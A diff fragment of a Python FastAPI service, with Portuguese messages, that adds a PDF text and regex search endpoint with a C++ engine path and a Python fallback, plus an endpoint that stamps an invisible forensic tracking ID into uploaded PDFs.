+                pages_text.append("")
+        
+        # Try C++ engine for large PDFs (>50 pages)
+        from security_middleware import cpp_engine
+        if cpp_engine.enabled and len(pages_text) > 50:
+            if is_regex:
+                result = cpp_engine.search_regex(pages_text, query, case_insensitive)
+            else:
+                result = cpp_engine.search_text(pages_text, query, case_insensitive)
+            
+            return {
+                "filename": file.filename,
+                "pages_searched": len(pages_text),
+                "engine": "cpp_search_engine",
+                **result
+            }
+        
+        # Python fallback for smaller PDFs
+        import re
+        results = []
+        total_matches = 0
+        flags = re.IGNORECASE if case_insensitive else 0
+        
+        for page_num, text in enumerate(pages_text):
+            if not text.strip():
+                continue
+            
+            if is_regex:
+                try:
+                    matches = list(re.finditer(query, text, flags))
+                except re.error as e:
+                    raise HTTPException(status_code=400, detail=f"Regex inválido: {str(e)}")
+            else:
+                search_text = text.lower() if case_insensitive else text
+                search_query = query.lower() if case_insensitive else query
+                matches = []
+                start = 0
+                while True:
+                    idx = search_text.find(search_query, start)
+                    if idx == -1:
+                        break
+                    matches.append(type('Match', (), {'start': lambda s, i=idx: i, 'end': lambda s, i=idx, q=query: i+len(q), 'group': lambda s, q=query: q})())
+                    start = idx + 1
+            
+            for match in matches:
+                pos = match.start()
+                # Context extraction
+                ctx_start = max(0, pos - 60)
+                ctx_end = min(len(text), match.end() + 60)
+                context = text[ctx_start:ctx_end].replace('\n', ' ')
+                
+                # Line number
+                line_num = text[:pos].count('\n') + 1
+                
+                results.append({
+                    "page": page_num + 1,
+                    "line": line_num,
+                    "position": pos,
+                    "matched": text[pos:match.end()][:100],
+                    "context": context,
+                })
+                total_matches += 1
+                
+                if total_matches >= 500:
+                    break
+            
+            if total_matches >= 500:
+                break
+        
+        return {
+            "filename": file.filename,
+            "pages_searched": len(pages_text),
+            "total_matches": total_matches,
+            "engine": "python_fallback",
+            "query": query,
+            "is_regex": is_regex,
+            "results": results,
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@router.post("/pdf/watermark")
+async def watermark_pdf(file: UploadFile = File(...), tracking_id: str = ""):
+    """Adiciona watermark forense invisível ao PDF com tracking ID único."""
+    try:
+        content = await file.read()
+        if len(content) > MAX_FILE_SIZE:
+            raise HTTPException(status_code=400, detail="Arquivo muito grande")
+        
+        if not tracking_id:
+            tracking_id = str(uuid.uuid4())
+        
+        pdf_file = io.BytesIO(content)
+        reader = PdfReader(pdf_file)
+        writer = PdfWriter()
+        
+        # Create watermark page with invisible text
+        watermark_buffer = io.BytesIO()
+        wm = canvas.Canvas(watermark_buffer, pagesize=letter)
+        
+        # Invisible text (white on white, 1pt font)
+        wm.setFont("Helvetica", 1)
+        wm.setFillColorRGB(1, 1, 1, 0.01)  # Nearly invisible
+        
+        # Distribute tracking ID across multiple positions
+        positions = [
+            (10, 10), (100, 10), (200, 10), (300, 10), (400, 10),
+            (10, 780), (200, 780), (400, 780),
+        ]
+        
+        marker = f"OdC-TID:{tracking_id}"
+        for x, y in positions:
+            wm.drawString(x, y, marker)
+        
+        wm.showPage()
+        wm.save()
+        watermark_buffer.seek(0)
+        
+        watermark_reader = PdfReader(watermark_buffer)
+        watermark_page = watermark_reader.pages[0]
+        
+        # Merge watermark into each page
+        for page in reader.pages:
+            page.merge_page(watermark_page)
+            writer.add_page(page)
+        
+        # Add tracking metadata
+        writer.add_metadata({
+            "/Keywords": f"odc-tracked:{tracking_id}",
+            "/CustomID": tracking_id,
+        })
+        
+        final_buffer = io.BytesIO()
+        writer.write(final_buffer)
+        final_buffer.seek(0)
+        
+        from fastapi.responses import StreamingResponse
+        return StreamingResponse(
+            final_buffer,
+            media_type="application/pdf",
+            headers={
+                "Content-Disposition": f"attachment; filename=watermarked_{file.filename}",
+                "X-Tracking-ID": tracking_id,
+                "X-Watermark-Method": "steganographic_text",
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
